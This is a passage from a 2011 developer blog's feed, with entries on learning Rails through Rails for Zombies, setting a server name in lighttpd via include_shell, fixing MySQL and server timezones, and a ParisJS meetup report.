
&lt;p&gt;Back to our Facebook example, you still won&amp;#39;t be able to see any outputs from
the calls Facebook is making to your app. Your best bet is to have a logging
system that will write on disk or in the DB so your can track the calls.&lt;/p&gt;

&lt;p&gt;Also note that you have to load the page in the iframe canvas, even for your
tests. You can&amp;#39;t simply load an html page and call &lt;code&gt;FB.ui({method:&amp;quot;pay&amp;quot;})&lt;/code&gt;,
this will result in error 1151. Always load in the whole FB page.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Working on Wednesday #5 : Rails documentation and Zombies</title>
   <link href="http://blog.pixelastic.com/2011/07/06/working-wednesday-5-rails-documentation-zombies/"/>
   <updated>2011-07-06T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/07/06/working-wednesday-5-rails-documentation-zombies</id>
   <content type="html">&lt;p&gt;Today I continue on my Rails for Zombie learning. Actually, I wake up kind of
late (11am), had to deal with noisy neighbors and make some shopping before
being really able to start working. It&amp;#39;s 2pm now, and I just open my browser.&lt;/p&gt;

&lt;h2&gt;Back to Zombies&lt;/h2&gt;

&lt;p&gt;I like the clean syntax Ruby provides. I like being able to pass custom
parameters without having to care about the order. This could be achieved in
cakePHP using array for options, but is much more clean the Ruby way, using
&lt;code&gt;truncate(zombie.graveyard, :length =&amp;gt; 10, :omission =&amp;gt; &amp;#39;&amp;#39;)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Also the &lt;code&gt;link_to&lt;/code&gt; and &lt;code&gt;new_{Model}_path&lt;/code&gt;, &lt;code&gt;edit_{Model}_path&lt;/code&gt; are clever and
allow easy access to the link you always use. This force you to logically
organise your app.&lt;/p&gt;

&lt;p&gt;The way Rails controllers pass vars to the view (using &lt;code&gt;@&lt;/code&gt;) is also cleaner
than the cakePHP &lt;code&gt;set&lt;/code&gt; method. I love those little things the language
permits.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;before_filter&lt;/code&gt; also seems more powerful than in cake world, being able to
define several of them and restrict them to certain action. Could be extended
(I guess) to an ApplicationController that could check on &lt;code&gt;show&lt;/code&gt;, &lt;code&gt;edit&lt;/code&gt;, etc
that the specified id exists and display an error message if not.&lt;/p&gt;

&lt;p&gt;I didn&amp;#39;t quite get the various &lt;code&gt;respond_as&lt;/code&gt; for JSON and XML. Why should I
have to pass the &lt;code&gt;@tweet&lt;/code&gt; while I don&amp;#39;t have to for the html view ?&lt;/p&gt;

&lt;p&gt;Also, the Rails routings system is more appealing to me than its cakePHP
counterpart. I would have loved to have such a nice tutorial for cake when I
learned it. Routing is very well explained in Rails for Zombies.&lt;/p&gt;

&lt;p&gt;After completing the Zombie tutorial, I headed to the famous blog tutorial
every web language should have. Once again, I started reading the doc and a
few things caught my attention as very promising :&lt;/p&gt;

&lt;h2&gt;Command line interface&lt;/h2&gt;

&lt;p&gt;I like the way one can create a new app simply with one command line. Such
feature is also provided by cakePHP but I never managed to make it work the
way I wanted to. That might have been influenced by the fact that I was
working on Windows at that time.&lt;/p&gt;

&lt;h2&gt;Directory structure&lt;/h2&gt;

&lt;p&gt;I also note that a Rail application seems greatly structured : there are
spaces defined for documentation, tests, database migration, dependencies,
logs, deployment scripts and so on.&lt;/p&gt;

&lt;h2&gt;Databases&lt;/h2&gt;

&lt;p&gt;This is great that Rails directly provides two distinct DB configurations :
development and production. I will no longer have to do it myself.&lt;/p&gt;

&lt;p&gt;Rails also uses SQLite3 as the default database for development. As I wasn&amp;#39;t
very familiar with this technology, I made some researchs. Turns out that
SQLite is a very simple DB system, perfectlynsuited for the development period
as it does not require a DB server.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Using environment vars in lighttpd config files</title>
   <link href="http://blog.pixelastic.com/2011/07/05/environment-vars-lighttpd-config-files/"/>
   <updated>2011-07-05T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/07/05/environment-vars-lighttpd-config-files</id>
   <content type="html">&lt;p&gt;Our game is hosted on a farm of servers behind a load balancer. All servers
are identical except for their names (&lt;code&gt;prod-01&lt;/code&gt;, &lt;code&gt;prod-02&lt;/code&gt;, etc) and virtual
IP addresses.&lt;/p&gt;

&lt;p&gt;In PHP, if I try to access &lt;code&gt;$_SERVER[&amp;#39;SERVER_NAME&amp;#39;]&lt;/code&gt;, I only got the domain
name &amp;quot;prod.game.com&amp;quot;. Actually, this was exactly the same var as the
&lt;code&gt;$_SERVER[&amp;#39;HTTP_HOST&amp;#39;]&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;For logging purposes, I needed to know the name of the server that my script
was currently running on. So I updated my &lt;code&gt;lighttpd.conf&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Lighty has a feature called &lt;code&gt;include_shell&lt;/code&gt; that you can use in its config
files. It will basically run a shell script and add its output to your file.&lt;/p&gt;

&lt;p&gt;So I wrote a simple shell script to define a &lt;code&gt;var.serverName&lt;/code&gt; (this is a
custom value, name it as you want, but keep the &lt;code&gt;var&lt;/code&gt; prefix) and then re-use
when needed.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;var.serverName=&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;uname -n&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;quot;&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Then, I included it in my &lt;code&gt;lighttpd.conf&lt;/code&gt; file using &lt;code&gt;include_shell
&amp;quot;/etc/lighttpd/scripts/serverName.sh&amp;quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;To define the PHP SERVER_NAME value :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ini&quot; data-lang=&quot;ini&quot;&gt;&lt;span class=&quot;na&quot;&gt;setenv.add-environment&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;(&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;  &amp;quot;SERVER_NAME&amp;quot; =&amp;gt; var.serverName&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;To add it as a Server: response Header :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ini&quot; data-lang=&quot;ini&quot;&gt;&lt;span class=&quot;na&quot;&gt;server.tag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;var.serverName&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Note that &lt;code&gt;include_shell&lt;/code&gt; directives are only called when you start lighty and
not on every request.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Incorrect MySQL date</title>
   <link href="http://blog.pixelastic.com/2011/07/04/incorrect-mysql-date/"/>
   <updated>2011-07-04T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/07/04/incorrect-mysql-date</id>
   <content type="html">&lt;p&gt;Several ingame time calculation we made in game are based on Paris time. Some
weeks ago, we decided to make a pass on all our servers to always use Paris
Time (GMT +1).&lt;/p&gt;

&lt;p&gt;Today, I spotted that logs we save in the DB have some date inaccuracy. It
appears that our mysql server and instances weren&amp;#39;t always updated to the
correct date. Some hours later, here is what I learned :&lt;/p&gt;

&lt;h2&gt;Finding and updating MySQL date&lt;/h2&gt;

&lt;p&gt;You can tell what timezone mysql should use when you start the service. If you
don&amp;#39;t specify anything, it will use the system time. Once loaded, you can get
its time by running &lt;code&gt;SELECT NOW()&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This is the easiest way to spot errors.&lt;/p&gt;

&lt;p&gt;To know the defined timezone, run &lt;code&gt;SELECT @@global.time_zone&lt;/code&gt;. If not defined,
you&amp;#39;ll read &lt;code&gt;SYSTEM&lt;/code&gt;, which is not very helpful.&lt;/p&gt;

&lt;p&gt;Note here that even if you changed the system date AFTER you started mysql,
mysql will still use the date that was in effect when you first launched it.&lt;/p&gt;

&lt;p&gt;It means that changing your server time will not affet running mysql
processes. You&amp;#39;ll have to restart mysql to do that : &lt;code&gt;sudo /etc/init.d/mysql
restart&lt;/code&gt;&lt;/p&gt;

&lt;h2&gt;Finding and updating the server date&lt;/h2&gt;

&lt;p&gt;Even after restarting mysql on some servers, the mysql date was still
incorrect. After connecting the the sql server, I found that it was the server
time that was incorrectly set (I just type &lt;code&gt;date&lt;/code&gt;).&lt;/p&gt;

&lt;p&gt;To update the current time zone, I had to call &lt;code&gt;sudo dpkg-reconfigure tzdata&lt;/code&gt;
(I&amp;#39;m using ubuntu) and choose the correct city&lt;/p&gt;

&lt;h2&gt;Updating mysql running through ndb_mgm&lt;/h2&gt;

&lt;p&gt;I&amp;#39;m no server expert, so this part was a little trickier. Some of our
databases are using ndb cluster for replication. Reloading those
configurations was harder.&lt;/p&gt;

&lt;p&gt;First, I had to connect to the server running the ndb management and call
&lt;code&gt;ndb_mgm&lt;/code&gt;. In the later prompt, I typed show and this get me the list of all
servers currently managed.&lt;/p&gt;

&lt;p&gt;I then shut them down typing &lt;code&gt;shutdown&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The, I reloaded the management and the node running on this server by doing
&lt;code&gt;sudo /etc/init.d/mysql-ndb-mgm restart&lt;/code&gt; and &lt;code&gt;sudo /etc/init.d/mysql-ndb
restart&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Finally, I had to connect to all the servers I saw earlier (with the show
command) and run &lt;code&gt;sudo /etc/init.d/mysql-ndb restart&lt;/code&gt;on each of them&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>ParisJS #8</title>
   <link href="http://blog.pixelastic.com/2011/06/30/parisjs-8/"/>
   <updated>2011-06-30T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/06/30/parisjs-8</id>
   <content type="html">&lt;p&gt;&lt;em&gt;(The whole conferences were in french, but as I&amp;#39;m writing every post on my
blog in english, I&amp;#39;ll write this one too.)&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Tonight I was attenting the 8th parisjs meetup. We had the chance to have it
hosted at Valtech, in a very wealthy part of Paris, in somptuous quarters and
a large room with giant screen (and great pizzas too).&lt;/p&gt;

&lt;p&gt;Anyway, this time the meetup was split in two : first part was made of
complete talks, while second part only had small lightning talks. With pizza
and beer in between.&lt;/p&gt;

&lt;h2&gt;Wakanda&lt;/h2&gt;

&lt;p&gt;The first talk was about &lt;a href=&quot;http://www.wakanda.org/&quot;&gt;Wakanda&lt;/a&gt;. Wakanda is a
complete suite of client/server Javascript which goal is to help create
business oriented apps. It is created by the same company as 4D, but this time
is completly open source.&lt;/p&gt;

&lt;p&gt;The product seemed well done, but kinda monolithic : server side js, client
side javascript framework, application studio, debugguer.&lt;/p&gt;

&lt;p&gt;I can surely see it used for creating Intranet applications, for some very
specific business cases. I have an ambiguous feeling about Wakanda. I think
they did a very good job, the whole package seems really neat, the IDE is
clear, client/server communication is smooth, etc. On the other hand I&amp;#39;m
always suspicious of apps that can do everything.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;(Note that I didn&amp;#39;t try the product, I only heard about it tonight for the
first time and watched a 20min presentation so that&amp;#39;s a little light for me to
give a precise opinion)&lt;/em&gt;&lt;/p&gt;

&lt;h2&gt;Joshfire Framework&lt;/h2&gt;

&lt;p&gt;A few months ago, &lt;a href=&quot;http://twitter.com/sylvinus&quot;&gt;@sylvinus&lt;/a&gt; from
&lt;a href=&quot;http://joshfire.com/&quot;&gt;Joshfire&lt;/a&gt; told us that they planned to realease their
framework, modeslty named &lt;a href=&quot;http://framework.joshfire.com/&quot;&gt;Joshfire&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;This is by far the most interesting presentation of the meetup. Joshfire is a
javascript framework aimed at working seamlessly between any devices :
desktop, mobile, iPad, TV, anything.&lt;/p&gt;

&lt;p&gt;It&amp;#39;s basic idea is to abstract to its bare bone any interaction. From what I
remember, for any &amp;quot;page&amp;quot; you want to define you have to write two JSON
structures.&lt;/p&gt;

&lt;p&gt;One defines the data tree (what your data is), the other defines the UI tree
(how your data can be interacted with). It also ships with some adapters (an
adapter is the link between the UI Tree and a specific device).&lt;/p&gt;

&lt;p&gt;All you have to do to port your Joshfire app to a new device is to write (or
grab if it already exists) an adapter. The main logic and data code is the
same for every device, the maintenance is now only focused on any specific
device.&lt;/p&gt;

&lt;p&gt;Even if the main idea of Joshfire is awesome, their documentation and
licensing is even more awesome : the project is already completly documented,
with examples and is also completly free and &lt;a href=&quot;https://github.com/joshfire/joshfire-framework&quot;&gt;available on
github&lt;/a&gt;.&lt;/p&gt;

&lt;h2&gt;CSON, no sorry, JISON&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;http://twitter.com/jie&quot;&gt;@jie&lt;/a&gt; was supposed to talk about CSON, a compressed
JSON. But as he already gave a very similar talk (about BSON) at the last&lt;/p&gt;

&lt;h1&gt;parisnode event, he changed the subject.&lt;/h1&gt;

&lt;p&gt;I&amp;#39;m not really sure what the real subject of the talk was. I think he
mentionned compiling Javascript into Javascript (much like CoffeeScript), but
it eventually turned into a Jison demo.&lt;/p&gt;

&lt;p&gt;Jison seems to be a tool for automating lexing and parsing languages, to
output new code. In effect, this could allow for transforming a custom
language into an existing language. CoffeeScript, Haml or Sass works that way
: they take a new language as input, and return Js, Html or Css as output.&lt;/p&gt;

&lt;p&gt;The advantages are that the custom language is usually much more concise, easy
to write and easy to read.&lt;/p&gt;

&lt;p&gt;Anyway, this presentation was full of nice quotes :&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The language I&amp;#39;m about to show you is totally useless.&lt;/p&gt;

&lt;p&gt;Pipe ? What is that ? Oh, you mean the strokes.&lt;/p&gt;

&lt;p&gt;The bad thing about Jison is that its documentation is crap&lt;/p&gt;

&lt;p&gt;Why does it work ? It was supposed to fail !&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;Overview of a dev life&lt;/h2&gt;

&lt;p&gt;This talk wasn&amp;#39;t about any new shiny technology. It was about those old
browsers and bad habits we had 10 years ago, and how we still managed to make
great websites.&lt;/p&gt;

&lt;p&gt;This remind me of the &amp;quot;good ol&amp;#39; days&amp;quot; when I discovered the web with FrontPage
and ClaraSoft. When IE6 was considered a modern browser.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://twitter.com/molokoloco&quot;&gt;@molokoloco&lt;/a&gt; show us that he managed to
simulate ajax using nested iframe, had a website still online and running even
after 10 years, was able to code full websites in 3 days, and had read more
than 50.000 blog posts. And all that while still using Windows and
Dreamweaver.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;(Small side note : I praise both @molokoloco and @jie for what they managed
to do. I know how easy it is to procrastinate and configure UI, test new tools
and IDE instead of getting things done. That didn&amp;#39;t seem to be an issue for
them.)&lt;/em&gt;&lt;/p&gt;

&lt;h2&gt;mongoDB&lt;/h2&gt;

&lt;p&gt;This talk was the first in the serie of lightning talks (less than 20mn). It
was about mongoDB and how to integrate it in a nodejs app.&lt;/p&gt;

&lt;p&gt;As I had never tried nor nodejs nor mongoDB I didn&amp;#39;t quite grasp what it was
really about. All I get is that in order to get a result from a mongoDB query,
one have to go through 3 steps of connection to the DB. In the asynchronous
world of nodejs, this doesn&amp;#39;t work well, so each step has to fire a callback
once executed.&lt;/p&gt;

&lt;p&gt;From there, I was lost. There was something about manually calling a callback
once initialized, but honestly I didn&amp;#39;t get it.&lt;/p&gt;

&lt;p&gt;Anyway, I learned from a small talk during pizza time that mongoDB was better
than couchDB (performance-wise), and that one have to sacrifice binding to the
altar of redundancy to get really fast response time.&lt;/p&gt;

&lt;h2&gt;Audio demo in less than 1kB. No, 800B. No, wait, 200B&lt;/h2&gt;

&lt;p&gt;This time the talk was a very fun demo. Using some simple minification
techniques, Js was able to play a random music.&lt;/p&gt;

&lt;p&gt;This involved encoding the wav file in base64 (taking special care of some
chars), and then playing it in an audio tag. Adding a bit of random to play a
different note on each loop.&lt;/p&gt;

&lt;p&gt;Fun, but interesting.&lt;/p&gt;

&lt;h2&gt;Some words about the Observer Pattern&lt;/h2&gt;

&lt;p&gt;This talk was more about theory than practice. Maybe it was the late hour, but
it didn&amp;#39;t catch my attention as the other did. Maybe someone would re-explain
it to me ?&lt;/p&gt;

&lt;p&gt;Well, I got the general idea : coding a js snippet that hard code the name of
the elements that should react is bad practice because of the maintanability
nightmare it cause when elements are removed.&lt;/p&gt;

&lt;p&gt;Instead, the speaker advocate the use of a MessageBroker. Some kind of general
listener that then dispatch event to element registered to that event (am I
right ?).&lt;/p&gt;

&lt;p&gt;Then someone in the audience noted that the opposite pattern should work
better : that every element registered itself to an event and react when such
event is fired (am I still right ?)&lt;/p&gt;

&lt;p&gt;Honestly, I really am not sure about this talk, so if anyone could fill the
blanks and correct me, I&amp;#39;d be glad.&lt;/p&gt;

&lt;h2&gt;Sencha and Sencha Touch&lt;/h2&gt;

&lt;p&gt;I won&amp;#39;t go into too much detail on that talk. This was a generic presentation
of Sencha (formerly known as ExtJs). I already had the basic understanding of
ExtJs (but not the expertise of some of the ExtJs experts in the room), so I
was really only half listening.&lt;/p&gt;

&lt;p&gt;Sencha is a great product. It is very similar to what Wakanda was showing in
the first talk. It is destined to data-heavy applications with lots of
numbers, columns, charts, pies, etc.&lt;/p&gt;

&lt;p&gt;Sencha Touch is a mobile version of Sencha. It is iOS oriented and emulate the
standard UI elements in HTML.&lt;/p&gt;

&lt;h2&gt;Mozilla Labs&lt;/h2&gt;

&lt;p&gt;A quick list of the Mozilla Labs projects. I honestly don&amp;#39;t remember them all,
except Tilt that is a 3D viewer of any web page. It simply calculate the DOM
depth and create a pyramid-like structure that you can browser in 3D.&lt;/p&gt;

&lt;p&gt;I&amp;#39;m sure that beyond the cool and shiny aspect, it can be useful as a
debug/optimisation tool.&lt;/p&gt;

&lt;h2&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Once again, thanks to #parisjs for those talks, always inspiring and a way to
meet new people.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;For all the new readers, I have an unfixed bug in my comment section : your
post can be invalidated if your are using Chrome with an email auto-filler. My
custom anti-spam will flag you as spam because Chrome fills an hidden honeypot
field.&lt;/em&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Working on Wednesday #4 : Rails for Zombies</title>
   <link href="http://blog.pixelastic.com/2011/06/29/working-wednesday-4-rails-zombies/"/>
   <updated>2011-06-29T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/06/29/working-wednesday-4-rails-zombies</id>
   <content type="html">&lt;p&gt;(I finally managed to update Ubuntu to the 10.10 version, configure Unity to
make it more usable, and I&amp;#39;m not ready to start the RoR tutorial I wanted to
start last week.)&lt;/p&gt;

&lt;p&gt;I used &lt;code&gt;vim&lt;/code&gt; this week (instead of &lt;code&gt;nano&lt;/code&gt;) for very simple file editing. I
will force myself to use only &lt;code&gt;vim&lt;/code&gt; on wednesday to really learn it. I plan to
completly drop Komodo Edit once I&amp;#39;ll be familar enough with vim to gain more
time than I lose.&lt;/p&gt;

&lt;h2&gt;Rails for Zombies&lt;/h2&gt;

&lt;p&gt;Anyway. I finally get to start the Rails for Zombies tutorial. And here is
what I learned.&lt;/p&gt;

&lt;p&gt;There are two distinct things I&amp;#39;m going to learn here : Ruby and Rails. I
discovered that I was already familiar with a lot of basic concepts of Rails,
thanks to cakePHP. Model and table convention, model relationships (belongs
to, has many, etc) were exactly the same.&lt;/p&gt;

&lt;p&gt;Ruby on the other hand was new. But also very interesting. No need to add &lt;code&gt;()&lt;/code&gt;
after a method to call it when no args are passed, possibility to chain method
of the same object (much like jQuery) and the use of dynamic (yet strongly
typed) vars.&lt;/p&gt;

&lt;p&gt;The first part of the tutorial (basic CRUD) was easy. I didn&amp;#39;t find how to
make a complex SQL query like this (cake) one :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;$Zombie-&amp;gt;find(&amp;#39;all&amp;#39;, array(&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;&amp;#39;order&amp;#39; =&amp;gt; array(&amp;#39;Zombie.graveyard&amp;#39; =&amp;gt; &amp;#39;ASC&amp;#39;, &amp;#39;Zombie.name&amp;#39; =&amp;gt; &amp;#39;DESC&amp;#39;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I guess it&amp;#39;s just a matter of time before I learn how to to do in Rails
anyway. I saw that there was more &amp;quot;advanced&amp;quot; method (much like the cake &lt;code&gt;find&lt;/code&gt;
method) that would surely allow such finding.&lt;/p&gt;

&lt;h2&gt;Part 2 : Validation and Relationships&lt;/h2&gt;

&lt;p&gt;The second part of the tutorial was more about models. Validation rules were
pretty much the same as those of cakePHP. But the Ruby syntax makes it more
concise.&lt;/p&gt;

&lt;p&gt;I couldn&amp;#39;t find how to retrieve the validation errors when saving an object
using the &lt;code&gt;create&lt;/code&gt; method (no problem when manually calling &lt;code&gt;save&lt;/code&gt;, though).&lt;/p&gt;

&lt;p&gt;I enjoyed being able to create binded instances by simply adding the binded
element to the model. Not very clear isn&amp;#39;t it ? Here some code to explain it
better. The last two lines have exactly the same effect :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Zombie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ActiveRecord&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Base&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Weapon&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ActiveRecord&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Base&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;belongs_to&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:zombie&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;Weapon&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Rocket Launcher&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:zombie_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;Weapon&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Rocket Launcher&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:zombie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Zombie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Later on, I had to select all weapons binded to a specific Zombie. I was able
to find the a specific zombie using any of the two following commands :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Zombie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Ash&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;first&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Zombie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:first&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:conditions&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Ash&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Then, I wanted to find the weapons binded to this zombie. First I tried the
following command :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;no&quot;&gt;Weapon&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:zombie_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Obviously, this worked. But I wanted to test some more of the Rails magic. So
I tried something along the lines of what I did in the previous chapter and
tried to use my &lt;code&gt;z&lt;/code&gt; var directly instead of &lt;code&gt;z.id&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;no&quot;&gt;Weapon&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:zombie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This didn&amp;#39;t worked. Well, I guess I&amp;#39;ll also learn why later on. But one even
more weird thing is that the following command did work even I&amp;#39;m not really
sur why ?&lt;/p&gt;
